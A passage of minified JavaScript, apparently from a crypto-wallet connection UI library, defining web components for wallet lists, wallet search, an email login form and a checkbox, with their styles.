    d="M43.4605 10.7248L28.0485 1.61089C25.5438 0.129705 22.4562 0.129705 19.9515 1.61088L4.53951 10.7248C2.03626 12.2051 0.5 14.9365 0.5 17.886V36.1139C0.5 39.0635 2.03626 41.7949 4.53951 43.2752L19.9515 52.3891C22.4562 53.8703 25.5438 53.8703 28.0485 52.3891L43.4605 43.2752C45.9637 41.7949 47.5 39.0635 47.5 36.114V17.8861C47.5 14.9365 45.9637 12.2051 43.4605 10.7248Z"
  />
</svg>`,m7e=ot`
  :host {
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    height: 104px;
    width: 104px;
    row-gap: ${({spacing:t})=>t[2]};
    background-color: ${({tokens:t})=>t.theme.foregroundPrimary};
    border-radius: ${({borderRadius:t})=>t[5]};
    position: relative;
  }

  wui-shimmer[data-type='network'] {
    border: none;
    -webkit-clip-path: var(--apkt-path-network);
    clip-path: var(--apkt-path-network);
  }

  svg {
    position: absolute;
    width: 48px;
    height: 54px;
    z-index: 1;
  }

  svg > path {
    stroke: ${({tokens:t})=>t.theme.foregroundSecondary};
    stroke-width: 1px;
  }

  @media (max-width: 350px) {
    :host {
      width: 100%;
    }
  }
`;var zae=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let eI=class extends $e{constructor(){super(...arguments),this.type="wallet"}render(){return X`
      ${this.shimmerTemplate()}
      <wui-shimmer width="80px" height="20px"></wui-shimmer>
    `}shimmerTemplate(){return this.type==="network"?X` <wui-shimmer data-type=${this.type} width="48px" height="54px"></wui-shimmer>
        ${Hae}`:X`<wui-shimmer width="56px" height="56px"></wui-shimmer>`}};eI.styles=[Dt,nr,m7e];zae([ie()],eI.prototype,"type",void 0);eI=zae([Ue("wui-card-select-loader")],eI);const g7e=mr`
  :host {
    display: grid;
    width: inherit;
    height: inherit;
  }
`;var Yc=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let ia=class extends $e{render(){return this.style.cssText=`
      grid-template-rows: ${this.gridTemplateRows};
      grid-template-columns: ${this.gridTemplateColumns};
      justify-items: ${this.justifyItems};
      align-items: ${this.alignItems};
      justify-content: ${this.justifyContent};
      align-content: ${this.alignContent};
      column-gap: ${this.columnGap&&`var(--apkt-spacing-${this.columnGap})`};
      row-gap: ${this.rowGap&&`var(--apkt-spacing-${this.rowGap})`};
      gap: ${this.gap&&`var(--apkt-spacing-${this.gap})`};
      padding-top: ${this.padding&&Cr.getSpacingStyles(this.padding,0)};
      padding-right: ${this.padding&&Cr.getSpacingStyles(this.padding,1)};
      padding-bottom: ${this.padding&&Cr.getSpacingStyles(this.padding,2)};
      padding-left: ${this.padding&&Cr.getSpacingStyles(this.padding,3)};
      margin-top: ${this.margin&&Cr.getSpacingStyles(this.margin,0)};
      margin-right: ${this.margin&&Cr.getSpacingStyles(this.margin,1)};
      margin-bottom: ${this.margin&&Cr.getSpacingStyles(this.margin,2)};
      margin-left: ${this.margin&&Cr.getSpacingStyles(this.margin,3)};
    `,X`<slot></slot>`}};ia.styles=[Dt,g7e];Yc([ie()],ia.prototype,"gridTemplateRows",void 0);Yc([ie()],ia.prototype,"gridTemplateColumns",void 0);Yc([ie()],ia.prototype,"justifyItems",void 0);Yc([ie()],ia.prototype,"alignItems",void 0);Yc([ie()],ia.prototype,"justifyContent",void 0);Yc([ie()],ia.prototype,"alignContent",void 0);Yc([ie()],ia.prototype,"columnGap",void 0);Yc([ie()],ia.prototype,"rowGap",void 0);Yc([ie()],ia.prototype,"gap",void 0);Yc([ie()],ia.prototype,"padding",void 0);Yc([ie()],ia.prototype,"margin",void 0);ia=Yc([Ue("wui-grid")],ia);const y7e=ot`
  button {
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    cursor: pointer;
    width: 104px;
    row-gap: ${({spacing:t})=>t[2]};
    padding: ${({spacing:t})=>t[3]} ${({spacing:t})=>t[0]};
    background-color: ${({tokens:t})=>t.theme.foregroundPrimary};
    border-radius: clamp(0px, ${({borderRadius:t})=>t[4]}, 20px);
    transition:
      color ${({durations:t})=>t.lg} ${({easings:t})=>t["ease-out-power-1"]},
      background-color ${({durations:t})=>t.lg}
        ${({easings:t})=>t["ease-out-power-1"]},
      border-radius ${({durations:t})=>t.lg}
        ${({easings:t})=>t["ease-out-power-1"]};
    will-change: background-color, color, border-radius;
    outline: none;
    border: none;
  }

  button > wui-flex > wui-text {
    color: ${({tokens:t})=>t.theme.textPrimary};
    max-width: 86px;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
    justify-content: center;
  }

  button > wui-flex > wui-text.certified {
    max-width: 66px;
  }

  @media (hover: hover) and (pointer: fine) {
    button:hover:enabled {
      background-color: ${({tokens:t})=>t.theme.foregroundSecondary};
    }
  }

  button:disabled > wui-flex > wui-text {
    color: ${({tokens:t})=>t.core.glass010};
  }

  [data-selected='true'] {
    background-color: ${({colors:t})=>t.accent020};
  }

  @media (hover: hover) and (pointer: fine) {
    [data-selected='true']:hover:enabled {
      background-color: ${({colors:t})=>t.accent010};
    }
  }

  [data-selected='true']:active:enabled {
    background-color: ${({colors:t})=>t.accent010};
  }

  @media (max-width: 350px) {
    button {
      width: 100%;
    }
  }
`;var cd=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let qc=class extends $e{constructor(){super(),this.observer=new IntersectionObserver(()=>{}),this.visible=!1,this.imageSrc=void 0,this.imageLoading=!1,this.isImpressed=!1,this.explorerId="",this.walletQuery="",this.certified=!1,this.displayIndex=0,this.wallet=void 0,this.observer=new IntersectionObserver(e=>{e.forEach(n=>{n.isIntersecting?(this.visible=!0,this.fetchImageSrc(),this.sendImpressionEvent()):this.visible=!1})},{threshold:.01})}firstUpdated(){this.observer.observe(this)}disconnectedCallback(){this.observer.disconnect()}render(){const e=this.wallet?.badge_type==="certified";return X`
      <button>
        ${this.imageTemplate()}
        <wui-flex flexDirection="row" alignItems="center" justifyContent="center" gap="1">
          <wui-text
            variant="md-regular"
            color="inherit"
            class=${et(e?"certified":void 0)}
            >${this.wallet?.name}</wui-text
          >
          ${e?X`<wui-icon size="sm" name="walletConnectBrown"></wui-icon>`:null}
        </wui-flex>
      </button>
    `}imageTemplate(){return!this.visible&&!this.imageSrc||this.imageLoading?this.shimmerTemplate():X`
      <wui-wallet-image
        size="lg"
        imageSrc=${et(this.imageSrc)}
        name=${et(this.wallet?.name)}
        .installed=${this.wallet?.installed??!1}
        badgeSize="sm"
      >
      </wui-wallet-image>
    `}shimmerTemplate(){return X`<wui-shimmer width="56px" height="56px"></wui-shimmer>`}async fetchImageSrc(){this.wallet&&(this.imageSrc=er.getWalletImage(this.wallet),!this.imageSrc&&(this.imageLoading=!0,this.imageSrc=await er.fetchWalletImage(this.wallet.image_id),this.imageLoading=!1))}sendImpressionEvent(){!this.wallet||this.isImpressed||(this.isImpressed=!0,tt.sendWalletImpressionEvent({name:this.wallet.name,walletRank:this.wallet.order,explorerId:this.explorerId,view:we.state.view,query:this.walletQuery,certified:this.certified,displayIndex:this.displayIndex}))}};qc.styles=y7e;cd([Ee()],qc.prototype,"visible",void 0);cd([Ee()],qc.prototype,"imageSrc",void 0);cd([Ee()],qc.prototype,"imageLoading",void 0);cd([Ee()],qc.prototype,"isImpressed",void 0);cd([ie()],qc.prototype,"explorerId",void 0);cd([ie()],qc.prototype,"walletQuery",void 0);cd([ie()],qc.prototype,"certified",void 0);cd([ie()],qc.prototype,"displayIndex",void 0);cd([ie({type:Object})],qc.prototype,"wallet",void 0);qc=cd([Ue("w3m-all-wallets-list-item")],qc);const b7e=ot`
  wui-grid {
    max-height: clamp(360px, 400px, 80vh);
    overflow: scroll;
    scrollbar-width: none;
    grid-auto-rows: min-content;
    grid-template-columns: repeat(auto-fill, 104px);
  }

  :host([data-mobile-fullscreen='true']) wui-grid {
    max-height: none;
  }

  @media (max-width: 350px) {
    wui-grid {
      grid-template-columns: repeat(2, 1fr);
    }
  }

  wui-grid[data-scroll='false'] {
    overflow: hidden;
  }

  wui-grid::-webkit-scrollbar {
    display: none;
  }

  w3m-all-wallets-list-item {
    opacity: 0;
    animation-duration: ${({durations:t})=>t.xl};
    animation-timing-function: ${({easings:t})=>t["ease-inout-power-2"]};
    animation-name: fade-in;
    animation-fill-mode: forwards;
  }

  @keyframes fade-in {
    from {
      opacity: 0;
    }
    to {
      opacity: 1;
    }
  }

  wui-loading-spinner {
    padding-top: ${({spacing:t})=>t[4]};
    padding-bottom: ${({spacing:t})=>t[4]};
    justify-content: center;
    grid-column: 1 / span 4;
  }
`;var Jp=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};const fW="local-paginator";let Jl=class extends $e{constructor(){super(),this.unsubscribe=[],this.paginationObserver=void 0,this.loading=!Ge.state.wallets.length,this.wallets=Ge.state.wallets,this.recommended=Ge.state.recommended,this.featured=Ge.state.featured,this.filteredWallets=Ge.state.filteredWallets,this.mobileFullScreen=de.state.enableMobileFullScreen,this.unsubscribe.push(Ge.subscribeKey("wallets",e=>this.wallets=e),Ge.subscribeKey("recommended",e=>this.recommended=e),Ge.subscribeKey("featured",e=>this.featured=e),Ge.subscribeKey("filteredWallets",e=>this.filteredWallets=e))}firstUpdated(){this.initialFetch(),this.createPaginationObserver()}disconnectedCallback(){this.unsubscribe.forEach(e=>e()),this.paginationObserver?.disconnect()}render(){return this.mobileFullScreen&&this.setAttribute("data-mobile-fullscreen","true"),X`
      <wui-grid
        data-scroll=${!this.loading}
        .padding=${["0","3","3","3"]}
        gap="2"
        justifyContent="space-between"
      >
        ${this.loading?this.shimmerTemplate(16):this.walletsTemplate()}
        ${this.paginationLoaderTemplate()}
      </wui-grid>
    `}async initialFetch(){this.loading=!0;const e=this.shadowRoot?.querySelector("wui-grid");e&&(await Ge.fetchWalletsByPage({page:1}),await e.animate([{opacity:1},{opacity:0}],{duration:200,fill:"forwards",easing:"ease"}).finished,this.loading=!1,e.animate([{opacity:0},{opacity:1}],{duration:200,fill:"forwards",easing:"ease"}))}shimmerTemplate(e,n){return[...Array(e)].map(()=>X`
        <wui-card-select-loader type="wallet" id=${et(n)}></wui-card-select-loader>
      `)}getWallets(){const e=[...this.featured,...this.recommended];this.filteredWallets?.length>0?e.push(...this.filteredWallets):e.push(...this.wallets);const n=xe.uniqueBy(e,"id"),r=Uc.markWalletsAsInstalled(n),i=Uc.filterWalletsByWcSupport(r);return Uc.markWalletsWithDisplayIndex(i)}walletsTemplate(){return this.getWallets().map((n,r)=>X`
        <w3m-all-wallets-list-item
          data-testid="wallet-search-item-${n.id}"
          @click=${()=>this.onConnectWallet(n)}
          .wallet=${n}
          explorerId=${n.id}
          certified=${this.badge==="certified"}
          displayIndex=${r}
        ></w3m-all-wallets-list-item>
      `)}paginationLoaderTemplate(){const{wallets:e,recommended:n,featured:r,count:i,mobileFilteredOutWalletsLength:s}=Ge.state,o=window.innerWidth<352?3:4,a=e.length+n.length;let l=Math.ceil(a/o)*o-a+o;return l-=e.length?r.length%o:0,i===0&&r.length>0?null:i===0||[...r,...e,...n].length<i-(s??0)?this.shimmerTemplate(l,fW):null}createPaginationObserver(){const e=this.shadowRoot?.querySelector(`#${fW}`);e&&(this.paginationObserver=new IntersectionObserver(([n])=>{if(n?.isIntersecting&&!this.loading){const{page:r,count:i,wallets:s}=Ge.state;s.length<i&&Ge.fetchWalletsByPage({page:r+1})}}),this.paginationObserver.observe(e))}onConnectWallet(e){Ce.selectWalletConnector(e)}};Jl.styles=b7e;Jp([Ee()],Jl.prototype,"loading",void 0);Jp([Ee()],Jl.prototype,"wallets",void 0);Jp([Ee()],Jl.prototype,"recommended",void 0);Jp([Ee()],Jl.prototype,"featured",void 0);Jp([Ee()],Jl.prototype,"filteredWallets",void 0);Jp([Ee()],Jl.prototype,"badge",void 0);Jp([Ee()],Jl.prototype,"mobileFullScreen",void 0);Jl=Jp([Ue("w3m-all-wallets-list")],Jl);const w7e=mr`
  wui-grid,
  wui-loading-spinner,
  wui-flex {
    height: 360px;
  }

  wui-grid {
    overflow: scroll;
    scrollbar-width: none;
    grid-auto-rows: min-content;
    grid-template-columns: repeat(auto-fill, 104px);
  }

  :host([data-mobile-fullscreen='true']) wui-grid {
    max-height: none;
    height: auto;
  }

  wui-grid[data-scroll='false'] {
    overflow: hidden;
  }

  wui-grid::-webkit-scrollbar {
    display: none;
  }

  wui-loading-spinner {
    justify-content: center;
    align-items: center;
  }

  @media (max-width: 350px) {
    wui-grid {
      grid-template-columns: repeat(2, 1fr);
    }
  }
`;var vA=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let Ag=class extends $e{constructor(){super(...arguments),this.prevQuery="",this.prevBadge=void 0,this.loading=!0,this.mobileFullScreen=de.state.enableMobileFullScreen,this.query=""}render(){return this.mobileFullScreen&&this.setAttribute("data-mobile-fullscreen","true"),this.onSearch(),this.loading?X`<wui-loading-spinner color="accent-primary"></wui-loading-spinner>`:this.walletsTemplate()}async onSearch(){(this.query.trim()!==this.prevQuery.trim()||this.badge!==this.prevBadge)&&(this.prevQuery=this.query,this.prevBadge=this.badge,this.loading=!0,await Ge.searchWallet({search:this.query,badge:this.badge}),this.loading=!1)}walletsTemplate(){const{search:e}=Ge.state,n=Uc.markWalletsAsInstalled(e),r=Uc.filterWalletsByWcSupport(n);return r.length?X`
      <wui-grid
        data-testid="wallet-list"
        .padding=${["0","3","3","3"]}
        rowGap="4"
        columngap="2"
        justifyContent="space-between"
      >
        ${r.map((i,s)=>X`
            <w3m-all-wallets-list-item
              @click=${()=>this.onConnectWallet(i)}
              .wallet=${i}
              data-testid="wallet-search-item-${i.id}"
              explorerId=${i.id}
              certified=${this.badge==="certified"}
              walletQuery=${this.query}
              displayIndex=${s}
            ></w3m-all-wallets-list-item>
          `)}
      </wui-grid>
    `:X`
        <wui-flex
          data-testid="no-wallet-found"
          justifyContent="center"
          alignItems="center"
          gap="3"
          flexDirection="column"
        >
          <wui-icon-box size="lg" color="default" icon="wallet"></wui-icon-box>
          <wui-text data-testid="no-wallet-found-text" color="secondary" variant="md-medium">
            No Wallet found
          </wui-text>
        </wui-flex>
      `}onConnectWallet(e){Ce.selectWalletConnector(e)}};Ag.styles=w7e;vA([Ee()],Ag.prototype,"loading",void 0);vA([Ee()],Ag.prototype,"mobileFullScreen",void 0);vA([ie()],Ag.prototype,"query",void 0);vA([ie()],Ag.prototype,"badge",void 0);Ag=vA([Ue("w3m-all-wallets-search")],Ag);var ij=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let b_=class extends $e{constructor(){super(...arguments),this.search="",this.badge=void 0,this.onDebouncedSearch=xe.debounce(e=>{this.search=e})}render(){const e=this.search.length>=2;return X`
      <wui-flex .padding=${["1","3","3","3"]} gap="2" alignItems="center">
        <wui-search-bar @inputChange=${this.onInputChange.bind(this)}></wui-search-bar>
        <wui-certified-switch
          ?checked=${this.badge==="certified"}
          @certifiedSwitchChange=${this.onCertifiedSwitchChange.bind(this)}
          data-testid="wui-certified-switch"
        ></wui-certified-switch>
        ${this.qrButtonTemplate()}
      </wui-flex>
      ${e||this.badge?X`<w3m-all-wallets-search
            query=${this.search}
            .badge=${this.badge}
          ></w3m-all-wallets-search>`:X`<w3m-all-wallets-list .badge=${this.badge}></w3m-all-wallets-list>`}
    `}onInputChange(e){this.onDebouncedSearch(e.detail)}onCertifiedSwitchChange(e){e.detail?(this.badge="certified",on.showSvg("Only WalletConnect certified",{icon:"walletConnectBrown",iconColor:"accent-100"})):this.badge=void 0}qrButtonTemplate(){return xe.isMobile()?X`
        <wui-icon-box
          size="xl"
          iconSize="xl"
          color="accent-primary"
          icon="qrCode"
          border
          borderColor="wui-accent-glass-010"
          @click=${this.onWalletConnectQr.bind(this)}
        ></wui-icon-box>
      `:null}onWalletConnectQr(){we.push("ConnectingWalletConnect")}};ij([Ee()],b_.prototype,"search",void 0);ij([Ee()],b_.prototype,"badge",void 0);b_=ij([Ue("w3m-all-wallets-view")],b_);const v7e=ot`
  button {
    display: flex;
    gap: ${({spacing:t})=>t[1]};
    padding: ${({spacing:t})=>t[4]};
    width: 100%;
    background-color: ${({tokens:t})=>t.theme.foregroundPrimary};
    border-radius: ${({borderRadius:t})=>t[4]};
    justify-content: center;
    align-items: center;
  }

  :host([data-size='sm']) button {
    padding: ${({spacing:t})=>t[2]};
    border-radius: ${({borderRadius:t})=>t[2]};
  }

  :host([data-size='md']) button {
    padding: ${({spacing:t})=>t[3]};
    border-radius: ${({borderRadius:t})=>t[3]};
  }

  button:hover {
    background-color: ${({tokens:t})=>t.theme.foregroundSecondary};
  }

  button:disabled {
    opacity: 0.5;
  }
`;var lw=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let Mp=class extends $e{constructor(){super(...arguments),this.text="",this.disabled=!1,this.size="lg",this.icon="copy",this.tabIdx=void 0}render(){this.dataset.size=this.size;const e=`${this.size}-regular`;return X`
      <button ?disabled=${this.disabled} tabindex=${et(this.tabIdx)}>
        <wui-icon name=${this.icon} size=${this.size} color="default"></wui-icon>
        <wui-text align="center" variant=${e} color="primary">${this.text}</wui-text>
      </button>
    `}};Mp.styles=[Dt,nr,v7e];lw([ie()],Mp.prototype,"text",void 0);lw([ie({type:Boolean})],Mp.prototype,"disabled",void 0);lw([ie()],Mp.prototype,"size",void 0);lw([ie()],Mp.prototype,"icon",void 0);lw([ie()],Mp.prototype,"tabIdx",void 0);Mp=lw([Ue("wui-list-button")],Mp);const E7e=mr`
  :host {
    position: relative;
    display: inline-block;
    width: 100%;
  }
`;var EA=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let Cg=class extends $e{constructor(){super(...arguments),this.disabled=!1}render(){return X`
      <wui-input-text
        type="email"
        placeholder="Email"
        icon="mail"
        size="lg"
        .disabled=${this.disabled}
        .value=${this.value}
        data-testid="wui-email-input"
        tabIdx=${et(this.tabIdx)}
      ></wui-input-text>
      ${this.templateError()}
    `}templateError(){return this.errorMessage?X`<wui-text variant="sm-regular" color="error">${this.errorMessage}</wui-text>`:null}};Cg.styles=[Dt,E7e];EA([ie()],Cg.prototype,"errorMessage",void 0);EA([ie({type:Boolean})],Cg.prototype,"disabled",void 0);EA([ie()],Cg.prototype,"value",void 0);EA([ie()],Cg.prototype,"tabIdx",void 0);Cg=EA([Ue("wui-email-input")],Cg);const _7e=ot`
  wui-separator {
    margin: ${({spacing:t})=>t[3]} calc(${({spacing:t})=>t[3]} * -1);
    width: calc(100% + ${({spacing:t})=>t[3]} * 2);
  }

  wui-email-input {
    width: 100%;
  }

  form {
    width: 100%;
    display: block;
    position: relative;
  }

  wui-icon-link,
  wui-loading-spinner {
    position: absolute;
    top: 50%;
    transform: translateY(-50%);
  }

  wui-icon-link {
    right: ${({spacing:t})=>t[2]};
  }

  wui-loading-spinner {
    right: ${({spacing:t})=>t[3]};
  }

  wui-text {
    margin: ${({spacing:t})=>t[2]} ${({spacing:t})=>t[3]}
      ${({spacing:t})=>t[0]} ${({spacing:t})=>t[3]};
  }
`;var Yg=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let Uf=class extends $e{constructor(){super(),this.unsubscribe=[],this.formRef=bA(),this.email="",this.loading=!1,this.error="",this.remoteFeatures=de.state.remoteFeatures,this.hasExceededUsageLimit=Ge.state.plan.hasExceededUsageLimit,this.unsubscribe.push(de.subscribeKey("remoteFeatures",e=>{this.remoteFeatures=e}),Ge.subscribeKey("plan",e=>this.hasExceededUsageLimit=e.hasExceededUsageLimit))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}firstUpdated(){this.formRef.value?.addEventListener("keydown",e=>{e.key==="Enter"&&this.onSubmitEmail(e)})}render(){const e=ke.hasAnyConnection(ge.CONNECTOR_ID.AUTH);return X`
      <form ${wA(this.formRef)} @submit=${this.onSubmitEmail.bind(this)}>
        <wui-email-input
          @focus=${this.onFocusEvent.bind(this)}
          .disabled=${this.loading}
          @inputChange=${this.onEmailInputChange.bind(this)}
          tabIdx=${et(this.tabIdx)}
          ?disabled=${e||this.hasExceededUsageLimit}
        >
        </wui-email-input>

        ${this.submitButtonTemplate()}${this.loadingTemplate()}
        <input type="submit" hidden />
      </form>
      ${this.templateError()}
    `}submitButtonTemplate(){return!this.loading&&this.email.length>3?X`
          <wui-icon-link
            size="sm"
            icon="chevronRight"
            iconcolor="accent-100"
            @click=${this.onSubmitEmail.bind(this)}
          >
          </wui-icon-link>
        `:null}loadingTemplate(){return this.loading?X`<wui-loading-spinner size="md" color="accent-primary"></wui-loading-spinner>`:null}templateError(){return this.error?X`<wui-text variant="sm-medium" color="error">${this.error}</wui-text>`:null}onEmailInputChange(e){this.email=e.detail.trim(),this.error=""}async onSubmitEmail(e){if(!s1.isValidEmail(this.email)){Yi.open({displayMessage:Es.ALERT_WARNINGS.INVALID_EMAIL.displayMessage},"warning");return}if(!ge.AUTH_CONNECTOR_SUPPORTED_CHAINS.find(r=>r===Y.state.activeChain)){const r=Y.getFirstCaipNetworkSupportsAuthConnector();if(r){we.push("SwitchNetwork",{network:r});return}}try{if(this.loading)return;this.loading=!0,e.preventDefault();const r=Ce.getAuthConnector();if(!r)throw new Error("w3m-email-login-widget: Auth connector not found");const{action:i}=await r.provider.connectEmail({email:this.email});if(tt.sendEvent({type:"track",event:"EMAIL_SUBMITTED"}),i==="VERIFY_OTP")tt.sendEvent({type:"track",event:"EMAIL_VERIFICATION_CODE_SENT"}),we.push("EmailVerifyOtp",{email:this.email});else if(i==="VERIFY_DEVICE")we.push("EmailVerifyDevice",{email:this.email});else if(i==="CONNECT"){const s=this.remoteFeatures?.multiWallet;await ke.connectExternal(r,Y.state.activeChain),s?(we.replace("ProfileWallets"),on.showSuccess("New Wallet Added")):we.replace("Account")}}catch(r){xe.parseError(r)?.includes("Invalid email")?this.error="Invalid email. Try again.":on.showError(r)}finally{this.loading=!1}}onFocusEvent(){tt.sendEvent({type:"track",event:"EMAIL_LOGIN_SELECTED"})}};Uf.styles=_7e;Yg([ie()],Uf.prototype,"tabIdx",void 0);Yg([Ee()],Uf.prototype,"email",void 0);Yg([Ee()],Uf.prototype,"loading",void 0);Yg([Ee()],Uf.prototype,"error",void 0);Yg([Ee()],Uf.prototype,"remoteFeatures",void 0);Yg([Ee()],Uf.prototype,"hasExceededUsageLimit",void 0);Uf=Yg([Ue("w3m-email-login-widget")],Uf);const A7e=ot`
  label {
    display: inline-flex;
    align-items: center;
    cursor: pointer;
    user-select: none;
    column-gap: ${({spacing:t})=>t[2]};
  }

  label > input[type='checkbox'] {
    height: 0;
    width: 0;
    opacity: 0;
    position: absolute;
  }

  label > span {
    display: flex;
    align-items: center;
    justify-content: center;
    height: 100%;
    width: 100%;
    border: 1px solid ${({colors:t})=>t.neutrals400};
    color: ${({colors:t})=>t.white};
    background-color: transparent;
    will-change: border-color, background-color;
  }

  label > span > wui-icon {
    opacity: 0;
    will-change: opacity;
  }

  label > input[type='checkbox']:checked + span > wui-icon {
    color: ${({colors:t})=>t.white};
  }

  label > input[type='checkbox']:not(:checked) > span > wui-icon {
    color: ${({colors:t})=>t.neutrals900};
  }

  label > input[type='checkbox']:checked + span > wui-icon {
    opacity: 1;
  }

  /* -- Sizes --------------------------------------------------- */
  label[data-size='lg'] > span {
    width: 24px;
    height: 24px;
    min-width: 24px;
    min-height: 24px;
    border-radius: ${({borderRadius:t})=>t[10]};
  }

  label[data-size='md'] > span {
    width: 20px;
    height: 20px;
    min-width: 20px;
    min-height: 20px;
    border-radius: ${({borderRadius:t})=>t[2]};
  }

  label[data-size='sm'] > span {
    width: 16px;
    height: 16px;
    min-width: 16px;
    min-height: 16px;
    border-radius: ${({borderRadius:t})=>t[1]};
  }

  /* -- Focus states --------------------------------------------------- */
  label > input[type='checkbox']:focus-visible + span,
  label > input[type='checkbox']:focus + span {
    border: 1px solid ${({tokens:t})=>t.core.borderAccentPrimary};
    box-shadow: 0px 0px 0px 4px rgba(9, 136, 240, 0.2);
  }

  /* -- Checked states --------------------------------------------------- */
  label > input[type='checkbox']:checked + span {
    background-color: ${({tokens:t})=>t.core.iconAccentPrimary};
    border: 1px solid transparent;
  }

  /* -- Hover states --------------------------------------------------- */
  input[type='checkbox']:not(:checked):not(:disabled) + span:hover {
    border: 1px solid ${({colors:t})=>t.neutrals700};
    background-color: ${({colors:t})=>t.neutrals800};
    box-shadow: none;
  }

  input[type='checkbox']:checked:not(:disabled) + span:hover {
    border: 1px solid transparent;
    background-color: ${({colors:t})=>t.accent080};
    box-shadow: none;
  }

  /* -- Disabled state --------------------------------------------------- */
  label > input[type='checkbox']:checked:disabled + span {
    border: 1px solid transparent;
    opacity: 0.3;
  }

  label > input[type='checkbox']:not(:checked):disabled + span {
    border: 1px solid ${({colors:t})=>t.neutrals700};
  }

  label:has(input[type='checkbox']:disabled) {
    cursor: auto;
  }

  label > input[type='checkbox']:disabled + span {
    cursor: not-allowed;
  }
`;var m8=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};const C7e={lg:"md",md:"sm",sm:"sm"};let k1=class extends $e{constructor(){super(...arguments),this.inputElementRef=bA(),this.checked=void 0,this.disabled=!1,this.size="md"}render(){const e=C7e[this.size];return X`
      <label data-size=${this.size}>
        <input
          ${wA(this.inputElementRef)}
          ?checked=${et(this.checked)}
          ?disabled=${this.disabled}
          type="checkbox"
          @change=${this.dispatchChangeEvent}
        />
        <span>
          <wui-icon name="checkmarkBold" size=${e}></wui-icon>
        </span>
        <slot></slot>
      </label>
    `}dispatchChangeEvent(){this.dispatchEvent(new CustomEvent("checkboxChange",{detail:this.inputElementRef.value?.checked,bubbles:!0,composed:!0}))}};k1.styles=[Dt,A7e];m8([ie({type:Boolean})],k1.prototype,"checked",void 0);m8([ie({type:Boolean})],k1.prototype,"disabled",void 0);m8([ie()],k1.prototype,"size",void 0);k1=m8([Ue("wui-checkbox")],k1);const S7e=ot`
  :host {
    display: flex;
    align-items: center;
    justify-content: center;
  }
  wui-checkbox {
    padding: ${({spacing:t})=>t[3]};
  }
  a {
    text-decoration: none;
    color: ${({tokens:t})=>t.theme.textSecondary};
    font-weight: 500;
  }
